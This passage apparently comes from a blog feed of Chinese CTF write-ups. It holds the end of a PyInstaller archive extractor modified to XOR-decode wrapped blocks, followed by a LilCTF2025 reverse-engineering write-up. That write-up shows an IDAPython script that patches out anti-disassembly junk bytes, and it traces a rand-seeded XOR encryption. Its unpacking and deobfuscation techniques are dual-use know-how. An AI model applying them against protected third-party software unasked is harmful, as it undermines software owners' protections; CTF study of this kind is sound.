class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.tocList)))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_writeRawData</span>(<span class="hljs-params">self, filepath, data</span>):<br>        nm = filepath.replace(<span class="hljs-string">&#x27;\\&#x27;</span>, os.path.sep).replace(<span class="hljs-string">&#x27;/&#x27;</span>, os.path.sep).replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>)<br>        nmDir = os.path.dirname(nm)<br>        <span class="hljs-keyword">if</span> nmDir != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.exists(nmDir):<br>            os.makedirs(nmDir)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(nm, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(data)<br><br>    <span class="hljs-comment"># 新增：处理 XOR 包裹数据</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_maybe_xor_decode</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b&quot;swdd&quot;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Detected XOR-wrapped block, decoding...&quot;</span>)<br>            data = data[<span class="hljs-number">4</span>:]  <span class="hljs-comment"># 去掉头 &quot;swdd&quot;</span><br>            data = <span class="hljs-built_in">bytes</span>([b ^ <span class="hljs-number">0xAA</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data])<br>        <span class="hljs-keyword">return</span> data<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFiles</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Beginning extraction...please standby&#x27;</span>)<br>        extractionDir = os.path.join(os.getcwd(), os.path.basename(<span class="hljs-variable language_">self</span>.filePath) + <span class="hljs-string">&#x27;_extracted&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractionDir):<br>            os.mkdir(extractionDir)<br><br>        os.chdir(extractionDir)<br><br>        <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.tocList:<br>            <span class="hljs-variable language_">self</span>.fPtr.seek(entry.position, os.SEEK_SET)<br>            data = <span class="hljs-variable language_">self</span>.fPtr.read(entry.cmprsdDataSize)<br><br>            <span class="hljs-keyword">if</span> entry.cmprsFlag == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    data = <span class="hljs-variable language_">self</span>._maybe_xor_decode(data)  <span class="hljs-comment"># &lt;&lt;== 新增</span><br>                    data = zlib.decompress(data)<br>                <span class="hljs-keyword">except</span> zlib.error:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : Failed to decompress &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name))<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) == entry.uncmprsdDataSize<br><br>            <span class="hljs-keyword">if</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;d&#x27;</span> <span class="hljs-keyword">or</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;o&#x27;</span>:<br>                <span class="hljs-keyword">continue</span><br><br>            basePath = os.path.dirname(entry.name)<br>            <span class="hljs-keyword">if</span> basePath != <span class="hljs-string">&#x27;&#x27;</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(basePath):<br>                    os.makedirs(basePath)<br><br>            <span class="hljs-keyword">if</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;s&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Possible entry point: &#123;0&#125;.pyc&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name))<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                    <span class="hljs-variable language_">self</span>.barePycList.append(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>._writePyc(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br><br>            <span class="hljs-keyword">elif</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;M&#x27;</span> <span class="hljs-keyword">or</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;m&#x27;</span>:<br>                <span class="hljs-keyword">if</span> data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;\r\n&#x27;</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>: <br>                        <span class="hljs-variable language_">self</span>.pycMagic = data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>                    <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                        <span class="hljs-variable language_">self</span>.barePycList.append(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                    <span class="hljs-variable language_">self</span>._writePyc(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>._writeRawData(entry.name, data)<br><br>                <span class="hljs-keyword">if</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;z&#x27;</span> <span class="hljs-keyword">or</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;Z&#x27;</span>:<br>                    <span class="hljs-variable language_">self</span>._extractPyz(entry.name)<br><br>        <span class="hljs-variable language_">self</span>._fixBarePycs()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_fixBarePycs</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> pycFile <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.barePycList:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pycFile, <span class="hljs-string">&#x27;r+b&#x27;</span>) <span class="hljs-keyword">as</span> pycFile:<br>                pycFile.write(<span class="hljs-variable language_">self</span>.pycMagic)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_writePyc</span>(<span class="hljs-params">self, filename, data</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> pycFile:<br>            pycFile.write(<span class="hljs-variable language_">self</span>.pycMagic)<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.pymin &gt;= <span class="hljs-number">7</span>:<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">else</span>:<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.pymin &gt;= <span class="hljs-number">3</span>:<br>                    pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>            pycFile.write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_extractPyz</span>(<span class="hljs-params">self, name</span>):<br>        dirName =  name + <span class="hljs-string">&#x27;_extracted&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dirName):<br>            os.mkdir(dirName)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            pyzMagic = f.read(<span class="hljs-number">4</span>)<br>            <span class="hljs-keyword">assert</span> pyzMagic == <span class="hljs-string">b&#x27;PYZ\0&#x27;</span><br>            pyzPycMagic = f.read(<span class="hljs-number">4</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                <span class="hljs-variable language_">self</span>.pycMagic = pyzPycMagic<br>            <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.pycMagic != pyzPycMagic:<br>                <span class="hljs-variable language_">self</span>.pycMagic = pyzPycMagic<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Warning: pyc magic of files inside PYZ archive are different&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj != sys.version_info.major <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.pymin != sys.version_info.minor:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Warning: Python version mismatch, skipping pyz extraction&#x27;</span>)<br>                <span class="hljs-keyword">return</span><br><br>            (tocPosition, ) = struct.unpack(<span class="hljs-string">&#x27;!i&#x27;</span>, f.read(<span class="hljs-number">4</span>))<br>            f.seek(tocPosition, os.SEEK_SET)<br><br>            <span class="hljs-keyword">try</span>:<br>                toc = marshal.load(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Unmarshalling FAILED. Cannot extract &#123;0&#125;.&#x27;</span>.<span class="hljs-built_in">format</span>(name))<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Found &#123;0&#125; files in PYZ archive&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(toc)))<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(toc) == <span class="hljs-built_in">list</span>:<br>                toc = <span class="hljs-built_in">dict</span>(toc)<br><br>            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> toc.keys():<br>                (ispkg, pos, length) = toc[key]<br>                f.seek(pos, os.SEEK_SET)<br>                fileName = key<br>                <span class="hljs-keyword">try</span>:<br>                    fileName = fileName.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">pass</span><br>                fileName = fileName.replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>).replace(<span class="hljs-string">&#x27;.&#x27;</span>, os.path.sep)<br><br>                <span class="hljs-keyword">if</span> ispkg == <span class="hljs-number">1</span>:<br>                    filePath = os.path.join(dirName, fileName, <span class="hljs-string">&#x27;__init__.pyc&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    filePath = os.path.join(dirName, fileName + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br><br>                fileDir = os.path.dirname(filePath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fileDir):<br>                    os.makedirs(fileDir)<br><br>                <span class="hljs-keyword">try</span>:<br>                    data = f.read(length)<br>                    data = zlib.decompress(data)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error: Failed to decompress &#123;0&#125;, probably encrypted.&#x27;</span>.<span class="hljs-built_in">format</span>(filePath))<br>                    <span class="hljs-built_in">open</span>(filePath + <span class="hljs-string">&#x27;.encrypted&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-variable language_">self</span>._writePyc(filePath, data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Usage: pyinstxtractor.py &lt;filename&gt;&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        arch = PyInstArchive(sys.argv[<span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">if</span> arch.<span class="hljs-built_in">open</span>():<br>            <span class="hljs-keyword">if</span> arch.checkFile():<br>                <span class="hljs-keyword">if</span> arch.getCArchiveInfo():<br>                    arch.parseTOC()<br>                    arch.extractFiles()<br>                    arch.close()<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Successfully extracted pyinstaller archive: &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">1</span>]))<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;You can now use a python decompiler on the pyc files within the extracted directory&#x27;</span>)<br>                    <span class="hljs-keyword">return</span><br>            arch.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LilCTF2025 WP</title>
    <link href="/2025/08/17/LilCTF2025/"/>
    <url>/2025/08/17/LilCTF2025/</url>
    
    <content type="html"><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="obfusheader-h"><a href="#obfusheader-h" class="headerlink" title="obfusheader.h"></a>obfusheader.h</h3><p>控制流混淆，题目中有给提示跟踪数据流<br>附件用 ida 打开之后有花指令和很多未识别成代码的数据，花指令的结构都是类似的一种<br><img src="/../images/LilCTF2025/o1.png"><br>在标签处(loc_14000C392)按 <code>U</code>,得到</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span>000000014000C390                 <span class="hljs-keyword">jz</span>      short <span class="hljs-built_in">near</span> <span class="hljs-built_in">ptr</span> unk_14000C393<br><span class="hljs-symbol">.text:</span>000000014000C390 <span class="hljs-comment">; ---------------------------------------------------------------------------</span><br><span class="hljs-symbol">.text:</span>000000014000C392                 <span class="hljs-built_in">db</span>    <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000014000C393 unk_14000C393   <span class="hljs-built_in">db</span>  <span class="hljs-number">0Fh</span>                 <span class="hljs-comment">; CODE XREF: sub_1400080A9+42E7↑j</span><br><span class="hljs-symbol">.text:</span>000000014000C394                 <span class="hljs-built_in">db</span> <span class="hljs-number">0B6h</span><br></code></pre></td></tr></table></figure><p>在 unk_14000C393 处按 <code>C</code>,得到</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C390</span>                 jz      short loc_14000C393<br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C390</span> ; <span class="hljs-params">---------------------------------------------------------------------------</span><br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C392</span>                 db    0<br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C393</span> ; <span class="hljs-params">---------------------------------------------------------------------------</span><br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C393</span><br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C393</span> loc_14000C393:                          ; CODE XREF: sub_1400080A9+42E7↑j<br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C393</span>                 movzx   eax, cs<span class="hljs-function">:byte_140035046</span><br><span class="hljs-string">.text</span><span class="hljs-function">:000000014000C39A</span>                 movsx   eax, al<br></code></pre></td></tr></table></figure><p>然后把 jz 到 loc_14000C393 位置的代码全部 nop 掉<br>由于有很多这种结构的花，可以选择用 ida 脚本批量修，但是我不知道为什么，不管是手修还是脚本修，全部修完之后都导致了最终动调时显示读到非法内存，动调不了，最后解决方案是一边看全部修好的反编译一边重新又修了一个能调试的，不过重新修的这个没有修完，只把 main 函数修得到了能反编译，其他的花是后面动调遇到时再去修的<br>ps：后来请教了其他师傅用脚本修花，贴一个 ida 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> idaapi <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> idautils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> idc <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ida_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">patch_and_reanalyze_all_functions</span>():<br>    pattern_str = <span class="hljs-string">&quot;74 01 00&quot;</span><br>    replacement_str = <span class="hljs-string">&quot;90 90 90&quot;</span><br>    pattern_bytes = <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> pattern_str.split() <span class="hljs-keyword">if</span> b])<br>    replacement_bytes = <span class="hljs-built_in">bytes</span>([<span class="hljs-built_in">int</span>(b, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> replacement_str.split() <span class="hljs-keyword">if</span> b])<br>    pattern_len = <span class="hljs-built_in">len</span>(pattern_bytes)<br>    func_starts = []<br>    <span class="hljs-keyword">for</span> func_ea <span class="hljs-keyword">in</span> Functions():<br>        seg_name = get_segm_name(func_ea)<br>        <span class="hljs-keyword">if</span> seg_name <span class="hljs-keyword">and</span> seg_name.lower() <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;.text&quot;</span>, <span class="hljs-string">&quot;text&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>):<br>            func_starts.append(func_ea)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Collected %d function start addresses in .text segment.&quot;</span> % <span class="hljs-built_in">len</span>(func_starts))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Un-defining all functions...&quot;</span>)<br>    <span class="hljs-keyword">for</span> func_ea <span class="hljs-keyword">in</span> func_starts:<br>        end_ea = get_func_attr(func_ea, FUNCATTR_END)<br>        <span class="hljs-keyword">if</span> end_ea != BADADDR <span class="hljs-keyword">and</span> end_ea &gt; func_ea:<br>            del_items(func_ea, DELIT_SIMPLE, end_ea - func_ea)<br>        <span class="hljs-keyword">else</span>:<br>            del_items(func_ea, DELIT_SIMPLE, <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;All functions have been un-defined.&quot;</span>)<br>    <br>    text_seg = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> seg_ea <span class="hljs-keyword">in</span> Segments():<br>        seg_name = get_segm_name(seg_ea)<br>        <span class="hljs-keyword">if</span> seg_name <span class="hljs-keyword">and</span> seg_name.lower() <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;.text&quot;</span>, <span class="hljs-string">&quot;text&quot;</span>, <span class="hljs-string">&quot;code&quot;</span>):<br>            text_seg = seg_ea<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> text_seg:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: .text segment not found!&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>        <br>    start_ea = get_segm_start(text_seg)<br>    end_ea = get_segm_end(text_seg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Searching for pattern in .text segment [%08X - %08X]...&quot;</span> % (start_ea, end_ea))<br>    ea = start_ea<br>    found_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> ea &lt; end_ea - pattern_len:<br>        <span class="hljs-keyword">match</span> = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(pattern_len):<br>            <span class="hljs-keyword">if</span> get_wide_byte(ea + i) != pattern_bytes[i]:<br>                <span class="hljs-keyword">match</span> = <span class="hljs-literal">False</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Pattern found at address %08X, patching...&quot;</span> % ea)<br>            ida_bytes.patch_bytes(ea, replacement_bytes)<br>            found_count += <span class="hljs-number">1</span><br>            ea += pattern_len<br>        <span class="hljs-keyword">else</span>:<br>            ea += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Patching completed. Modified %d locations.&quot;</span> % found_count)<br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Re-creating original functions...&quot;</span>)<br>    created_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> func_ea <span class="hljs-keyword">in</span> func_starts:<br>        del_items(func_ea, DELIT_SIMPLE, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> add_func(func_ea) == <span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Warning: Failed to create function at %08X.&quot;</span> % func_ea)<br>        <span class="hljs-keyword">else</span>:<br>            created_count += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Function reconstruction completed. %d functions created.&quot;</span> % created_count)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    patch_and_reanalyze_all_functions()<br></code></pre></td></tr></table></figure><p>main 函数很长,先看到有个输入的提示语</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">LABEL_75:<br>  *(_BYTE *)v722 = <span class="hljs-number">1</span>;<br>  ((<span class="hljs-type">void</span> (__fastcall *)(<span class="hljs-keyword">const</span> <span class="hljs-type">char</span> *))qword_7FF79ABD54C0[*((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)v722 + <span class="hljs-number">1</span>)])(<span class="hljs-string">&quot;Please enter the flag: &quot;</span>);<br>  v686 = sub_7FF79ABC1780(&amp;v687);<br></code></pre></td></tr></table></figure><p>然后找到读取输入的地方</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs objectivec">LABEL_150:<br>  *(_BYTE *)v710 = <span class="hljs-number">1</span>;<br>  ((<span class="hljs-type">void</span> (*)(<span class="hljs-keyword">const</span> <span class="hljs-type">char</span> *, ...))funcs_1400247DB[*((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)v710 + <span class="hljs-number">1</span>)])(<span class="hljs-string">&quot;%100s&quot;</span>, input);<br></code></pre></td></tr></table></figure><p>然后开始打断点动调，会发现它的读取经过一个很大的函数，是自定义的类似 scanf 的实现，测试之后知道正确的输入应该是 40 字节，输入 LilCTF{12312345678901234567890123456789} 之后找到 input 数组，点进去，给input 数组打硬件断点,设置 size 为 0x28<br><img src="/../images/LilCTF2025/o2.png"><br>每次 input 发生变化时，都会触发断点，就可以据此跟踪数据流找到加密<br><strong>第一处加密</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">unsigned __int64 __fastcall <span class="hljs-keyword">sub_7FF6EDA37842(__int64 </span><span class="hljs-built_in">a1</span>, unsigned __int64 <span class="hljs-built_in">a2</span>)<br>&#123;<br>  unsigned __int64 result<span class="hljs-comment">; // rax</span><br>  int i<span class="hljs-comment">; // [rsp+2Ch] [rbp-4h]</span><br><br>  for ( i = <span class="hljs-number">0</span><span class="hljs-comment">; ; ++i )</span><br>  &#123;<br>    result = <span class="hljs-built_in">a2</span> &gt;&gt; <span class="hljs-number">1</span>;<br>    if ( i &gt;= <span class="hljs-built_in">a2</span> &gt;&gt; <span class="hljs-number">1</span> )<br>      <span class="hljs-keyword">break;</span><br><span class="hljs-keyword"></span>    *(_WORD *)(<span class="hljs-number">2</span>i64 * i + <span class="hljs-built_in">a1</span>) ^= rand();<br>  &#125;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>找到 srand()</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// attributes: thunk</span><br><span class="hljs-function"><span class="hljs-type">void</span> __cdecl <span class="hljs-title">srand</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> Seed)</span></span><br><span class="hljs-function"></span>&#123;<br>  __imp_srand(Seed);<br>&#125;<br></code></pre></td></tr></table></figure><p>动调找出种子是 <strong>0x000000048691412</strong>(seed 对应的寄存器值)<br><img src="/../images/LilCTF2025/o3.png"></p><p><strong>第二处加密</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> __fastcall <span class="hljs-title">encode</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">unsigned</span> __int64 a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> Character[<span class="hljs-number">36</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-A0h] BYREF</span><br>  <span class="hljs-type">char</span> v3; <span class="hljs-comment">// [rsp+B1h] [rbp-Fh]</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// [rsp+B2h] [rbp-Eh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v5; <span class="hljs-comment">// [rsp+B3h] [rbp-Dh]</span><br>  <span class="hljs-type">int</span> k; <span class="hljs-comment">// [rsp+B4h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+B8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+BCh] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    v5 = *(_BYTE *)(a1 + i);<br>    v4 = <span 